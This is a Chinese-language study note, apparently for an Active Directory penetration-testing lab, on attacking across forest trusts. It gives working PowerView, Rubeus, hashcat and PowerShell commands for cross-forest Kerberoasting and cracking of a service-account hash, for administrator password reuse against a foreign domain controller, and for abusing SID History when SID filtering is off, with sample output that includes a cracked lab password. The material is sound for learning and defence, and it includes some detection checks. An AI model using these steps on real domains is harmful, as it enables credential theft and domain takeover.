## 學習目標

- 對跨樹系信任執行跨樹系 Kerberoasting，取得外部網域服務帳號憑證。
- 用 Get-DomainForeignGroupMember 找出跨樹系群組成員，並以管理員密碼重複使用取得外部樹系存取。
- 理解 SID History 跨樹系濫用原理，在 SID 過濾未啟用時維持跨域存取。

---

## 理論基礎

```text
跨樹系攻擊前提：
  → 兩個樹系之間存在 Forest 信任（ForestTransitive = True）
  → 方向為 Bidirectional 或 Outbound（可從當前樹系查詢外部樹系）

三大攻擊向量：
  ┌─────────────────────────────────────────────────────────────────────┐
  │ 攻擊向量               │ 前提                    │ 效果             │
  ├─────────────────────────────────────────────────────────────────────┤
  │ 跨樹系 Kerberoasting   │ 外部網域有 SPN 帳號      │ 取得服務帳號 TGS │
  │ 外部群組成員（密碼重用）│ 管理員帳號在外部群組      │ 直接存取外部 DC  │
  │ SID History 跨樹系濫用 │ SID 過濾未啟用，帳號遷移  │ 保留原域存取權限 │
  └─────────────────────────────────────────────────────────────────────┘
```

## 一、跨樹系 Kerberoasting

### 理論

```text
跨樹系 Kerberoasting：
  → Kerberos 信任允許跨樹系取得 TGS
  → 若外部樹系有設定 SPN 的服務帳號 → 可請求該帳號的 TGS
  → TGS 以服務帳號 NTLM 雜湊加密 → 離線暴力破解

實驗環境範例：
  → FREIGHTLOGISTICS.LOCAL 樹系
  → mssqlsvc 帳號設有 SPN → 同時是 FREIGHTLOGISTICS 的 Domain Admins 成員
  → 攻擊路徑：Kerberoast mssqlsvc → 破解密碼 → 取得外部樹系 DA
```

```powershell
# 步驟一：列舉外部樹系中有 SPN 的帳號（PowerView）
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL |
  Select SamAccountName, ServicePrincipalName

# 輸出範例：
# SamAccountName      : mssqlsvc
# ServicePrincipalName: MSSQLSvc/sql01.freightlogistics.local:1433
# → mssqlsvc 在外部樹系有 SPN → Kerberoast 目標

# 步驟二：確認該帳號的群組成員（確認攻擊價值）
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |
  Select samaccountname, memberof
# → 若 memberof 含 Domain Admins → 破解後直接取得外部 DA
```

```powershell
# 步驟三：執行跨樹系 Kerberoasting（Rubeus）
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
# /domain:FREIGHTLOGISTICS.LOCAL → 指定外部樹系網域
# /user:mssqlsvc              → 指定目標帳號
# /nowrap                     → 不換行輸出（便於複製雜湊）

# 輸出格式：
# [*] Hash                 : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$...
# → 複製 $krb5tgs$23$... 雜湊字串
```

```bash
# 步驟四：離線破解 TGS 雜湊（Linux）
hashcat -m 13100 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
# -m 13100 → Kerberos 5 TGS-REP etype 23（RC4）
# 輸出：mssqlsvc.hash:1logistics
# → 取得明文密碼 1logistics
```

## 二、外部群組成員（管理員密碼重用）

### 理論

```text
外部群組成員攻擊：
  → 跨樹系信任下，A 樹系的使用者可以是 B 樹系本機群組的成員
  → 常見情境：INLANEFREIGHT\administrator 是 FREIGHTLOGISTICS 的 Administrators 成員
  → 若密碼相同（密碼重用）→ 可直接以現有憑證登入外部 DC

Get-DomainForeignGroupMember：
  → 查詢外部樹系中含有「本樹系帳號」的群組
  → MemberDomain = 外部樹系 → GroupName = 外部群組 → MemberName = 外部樹系內的 SID
  → 用 Convert-SidToName 將 SID 轉換為可讀帳號名稱
```

```powershell
# 步驟一：查詢外部樹系中含有外部成員的群組（PowerView）
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
# -Domain FREIGHTLOGISTICS.LOCAL → 查詢目標樹系

# 輸出欄位判讀：
# GroupDomain   : FREIGHTLOGISTICS.LOCAL         → 外部樹系
# GroupName     : Administrators                  → 外部樹系的本機群組
# GroupDistinguishedName: CN=Administrators,...   → 群組 DN
# MemberDomain  : FREIGHTLOGISTICS.LOCAL         → 成員所屬網域（實際是跨域 SID）
# MemberName    : S-1-5-21-3842939050-...-500    → 成員 SID（待轉換）
# MemberDistinguishedName: CN=S-1-5-21-...,CN=ForeignSecurityPrincipals,...
# → ForeignSecurityPrincipals → 確認為外部安全主體（來自 INLANEFREIGHT.LOCAL）
```

```powershell
# 步驟二：將 SID 轉換為帳號名稱（PowerView）
Convert-SidToName S-1-5-21-3842939050-3880317187-2865463114-500
# 輸出：INLANEFREIGHT\administrator
# → 確認是 INLANEFREIGHT.LOCAL 的 administrator 帳號
# → 在 FREIGHTLOGISTICS.LOCAL 的 Administrators 群組內
```

```powershell
# 步驟三：確認密碼重用 → 以 INLANEFREIGHT administrator 帳號連入外部 DC
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL `
  -Credential INLANEFREIGHT\administrator
# -ComputerName → 外部樹系的 DC FQDN
# -Credential   → 使用 INLANEFREIGHT 樹系的 administrator 帳號
# 若密碼相同 → 成功進入外部樹系 DC 的 PowerShell 會話

# 進入後確認身份
whoami
# 輸出：inlanefreight\administrator
# → 以 INLANEFREIGHT 帳號身份在 FREIGHTLOGISTICS DC 上執行
```

## 三、SID History 跨樹系濫用

### 理論

```text
SID History 跨樹系濫用情境：
  → 企業併購或網域遷移時，帳號從來源網域遷移至目標網域
  → 遷移工具（ADMT 等）將來源網域的 SID 保留在目標帳號的 sidHistory 屬性中
  → 目的：讓遷移帳號在過渡期仍可存取來源網域的資源

攻擊成立條件：
  → sidHistory 中的 SID 未被移除（遷移後應清除但常被忽略）
  → 兩樹系之間 SID 過濾（SID Filtering）未啟用
  → SID 過濾啟用時：外部樹系的 Kerberos 票券不攜帶 sidHistory SID → 攻擊失效

實驗環境範例（來自遷移圖）：
  → jjones 帳號從 INLANEFREIGHT.LOCAL 遷移至 CORP.LOCAL
  → jjones@CORP.LOCAL 的 sidHistory 保留 INLANEFREIGHT.LOCAL 的 jjones SID
  → 若 INLANEFREIGHT 的 jjones 原本是高權限帳號（如 DA）
  → 則 jjones@CORP.LOCAL 在 INLANEFREIGHT.LOCAL 中仍被視為 DA
  → 在 SID 過濾未啟用的 Forest 信任下 → CORP 的 jjones 可存取 INLANEFREIGHT 資源

偵測方法：
  → 查詢帳號的 sidHistory 屬性
  → 若包含另一樹系的高權限 SID → 視為高風險
```

```powershell
# 查詢目標帳號的 sidHistory（PowerView）
Get-DomainUser -Domain CORP.LOCAL -Identity jjones |
  Select SamAccountName, sidHistory
# 輸出：
# SamAccountName : jjones
# sidHistory     : {S-1-5-21-INLANEFREIGHT-SID-500}  ← INLANEFREIGHT 的 jjones SID

# 確認 sidHistory 中的 SID 對應哪個帳號（INLANEFREIGHT 端）
Convert-SidToName S-1-5-21-INLANEFREIGHT-SID-500
# 輸出：INLANEFREIGHT\jjones（或其他高權限帳號）

# 確認信任的 SID 過濾設定（Get-ADTrust）
Get-ADTrust -Filter * | Select Name, SIDFilteringQuarantined
# SIDFilteringQuarantined = False → SID 過濾未啟用 → sidHistory 攻擊可行
# SIDFilteringQuarantined = True  → SID 過濾已啟用 → sidHistory 被過濾 → 攻擊失效
```

```text
SID History 遷移示意圖（jjones 帳號）：

  INLANEFREIGHT.LOCAL                    CORP.LOCAL
  ┌────────────────────┐                 ┌──────────────────────────────┐
  │ jjones             │  ── 遷移 ──→  │ jjones@CORP.LOCAL            │
  │ SID: S-1-5-21-ILF- │                │ sidHistory: S-1-5-21-ILF-... │
  │      ...-1105      │                │ （保留原 INLANEFREIGHT SID）  │
  │ 成員：Domain Admins│                │                              │
  └────────────────────┘                └──────────────────────────────┘
            ↑
  SID 過濾未啟用時：
  CORP.LOCAL 的 jjones 持有 INLANEFREIGHT DA SID
  → 對 INLANEFREIGHT 資源的存取請求被視為 DA
  → 可存取 INLANEFREIGHT 的 DC、共享資料夾等資源
```

## 判斷邏輯

```
取得樹系信任據點 → 選擇跨樹系攻擊向量
│
├── 跨樹系 Kerberoasting
│   ├── Get-DomainUser -SPN -Domain EXTERNAL.LOCAL
│   ├── 找到 SPN 帳號 → Rubeus kerberoast /domain:EXTERNAL.LOCAL /user:ACCOUNT /nowrap
│   └── 破解 TGS → hashcat -m 13100 → 取得外部帳號密碼
│       └── 確認帳號為 DA → 直接登入外部 DC
│
├── 外部群組成員
│   ├── Get-DomainForeignGroupMember -Domain EXTERNAL.LOCAL
│   ├── 找到 INLANEFREIGHT 帳號在外部 Administrators 群組
│   ├── Convert-SidToName → 確認帳號名稱
│   └── Enter-PSSession -ComputerName EXTERNAL-DC -Credential DOMAIN\account
│       └── 密碼重用 → 直接進入外部 DC
│
└── SID History 跨樹系濫用
    ├── Get-DomainUser -Domain EXTERNAL -Identity TARGET | Select sidHistory
    ├── sidHistory 含本樹系高權限 SID？
    │   ├── Get-ADTrust SIDFilteringQuarantined = False → 可行
    │   └── Convert-SidToName 確認 SID 對應帳號
    └── 以 EXTERNAL 帳號存取 INLANEFREIGHT 資源
        └── 不需額外工具 → 透過正常 Kerberos 流程（sidHistory SID 自動附加在 PAC）
```
